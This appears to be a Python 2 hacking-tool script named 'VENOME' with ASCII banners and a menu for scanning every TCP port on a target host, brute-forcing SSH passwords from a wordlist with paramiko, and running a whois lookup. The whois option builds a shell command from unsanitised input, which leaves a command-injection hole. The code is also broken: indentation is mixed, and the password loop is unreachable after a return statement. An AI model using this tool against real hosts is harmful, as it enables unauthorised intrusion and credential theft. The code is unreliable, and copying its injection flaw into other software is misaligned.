#!/usr/bin/python 
# -*- coding: utf-8 -*-
import socket
import subprocess
import sys
from datetime import datetime 
import paramiko, os

# Clear the screen 
subprocess.call('clear',shell=True)

# Banner 

header_ssh_brute = """
██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗    ███████╗███████╗██╗  ██╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔════╝██║  ██║
██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗      ███████╗███████╗███████║
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝      ╚════██║╚════██║██╔══██║
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗    ███████║███████║██║  ██║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝    ╚══════╝╚══════╝╚═╝  ╚═╝
                                                                                                              
"""


header_port = """
______          _                          
| ___ \        | |                         
| |_/ /__  _ __| |_    ___  ___ __ _ _ __  
|  __/ _ \| '__| __|  / __|/ __/ _` | '_ \ 
| | | (_) | |  | |_   \__ \ (_| (_| | | | |
\_|  \___/|_|   \__|  |___/\___\__,_|_| |_|
                                           
                                           
"""



header ="""
************************************************************************************
************************************************************************************
 ▄               ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄        ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄       ▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░▌             ▐░▌▐░░░░░░░░░░░▌▐░░▌      ▐░▌▐░░░░░░░░░░░▌▐░░▌     ▐░░▌▐░░░░░░░░░░░▌
 ▐░▌           ▐░▌ ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌░▌     ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌░▌   ▐░▐░▌▐░█▀▀▀▀▀▀▀▀▀ 
  ▐░▌         ▐░▌  ▐░▌          ▐░▌▐░▌    ▐░▌▐░▌       ▐░▌▐░▌▐░▌ ▐░▌▐░▌▐░▌          
   ▐░▌       ▐░▌   ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌ ▐░▌   ▐░▌▐░▌       ▐░▌▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄▄▄ 
    ▐░▌     ▐░▌    ▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌▐░▌       ▐░▌▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌
     ▐░▌   ▐░▌     ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌   ▐░▌ ▐░▌▐░▌       ▐░▌▐░▌   ▀   ▐░▌▐░█▀▀▀▀▀▀▀▀▀ 
      ▐░▌ ▐░▌      ▐░▌          ▐░▌    ▐░▌▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          
       ▐░▐░▌       ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌     ▐░▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ 
        ▐░▌        ▐░░░░░░░░░░░▌▐░▌      ▐░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
         ▀          ▀▀▀▀▀▀▀▀▀▀▀  ▀        ▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀ 
************************************************************************************
************************************************************************************
"""
def main():
	print(header)
	global choice
	print "" 
	print ""
	print "(1) Port Scanning" 
	print "(2) SSH Protocol Crack "
	print "(3) Whois Lookup"
	print ""

	choice = raw_input("Press the number: ")
        function()
def function():
	if choice == "1":
       		subprocess.call('clear',shell=True)
      	 	print(header_port)

      	 	# Ask for input
       		remoteServer = raw_input("Enter the remote host to scan: ")
       		remoteserverIP = socket.gethostbyname(remoteServer)

 	      	# Banner
       		print "-"*60
       		print "Waiting for the moment",remoteserverIP
       		print "-"*60

       		# Start time
       		t1 = datetime.now()


	       	try:
				  for port in range(1,65535):
	      	      			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	     		 		result = sock.connect_ex((remoteserverIP, port))
	      	          	  if result == 0:
			 		print "Port {}:     Open".format(port)
	         	 		sock.close()

	        except KeyboardInterrupt:
	     			 print "You pressed Cntrl+C"
	     		 	 sys.exit()

      	      	except socket.gaierror:
	      			print 'Hostname could not be resolved. Exiting'
	      			sys.exit()

       	       	except socket.error:
	      			print "Couldn't connect to server"
	      			sys.exit()

         	#Cal time
		t2 = datetime.now()

	      	tot = t2 - t1

	     	print "Scanning done in: ",tot
		con = raw_input("Do you wish to continue (y/n):")
		if con == "y":
			main()
		elif con == "n":
			sys.exit()
	if choice == "2":
			subprocess.call('clear',shell=True)
			print(header_ssh_brute)
			global host, username, line, input_file 
			line = "\n--------------------------------------------------\n"
			try:
					host = raw_input("[*] Enter Target Host Address: ")
					username = raw_input("[*] Enter SSH Username: ")
					input_file = raw_input("[*] Enter SSH Password File: ")
		
					if os.path.exists(input_file) == False:
						print "\n[*] File Path Does Not Exist !!!"
						sys.exit(0)
			except KeyboardInterrupt:
						print "\n\n[*] User Requested An Interrupt"
						sys.exit(0)


	   		def ssh_connect(password, code = 0):
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

				try:
					ssh.connect(host, port=22, username=username, password=password)
				except paramiko.AuthenticationException:
					code = 1
				except socket.error, e:
					code = 2
	
				ssh.close()
				return code
	
				input_file = open(input_file)


				for i in input_file.readlines():
					password = i.strip("\n")
					try:
						response = ssh_connect(password)
						if response == 0:
							print("%s[*] User: %s [*] Pass Found: %s%s" % (line, username, password, line))
							sys.exit(0)
						elif response == 1:	
							print("[*] User: %s [*] Pass: %s ==> Login Incorrect !!! <==" % (username, password))
						elif response == 2:
							print("[*] Connection Could Not Be Established To Address: %s" % (host))
							sys.exit(2)
					except Exception, e:
						print e
						pass
				input_file.close()
				con = raw_input("Do you wish to continue (y/n):")
			        if con == "y": 
                       			 main()
               			elif con == "n":
                        		 sys.exit()

	
        if choice == "3":

                ip = raw_input("Enter the host to lookup: ")
                cmd = "ipwhois_cli.py --addr " + ip
                os.system(cmd)
		con = raw_input("Do you wish to continue (y/n):")
                if con == "y": 
                        main()
                elif con == "n":
                        sys.exit()


main()
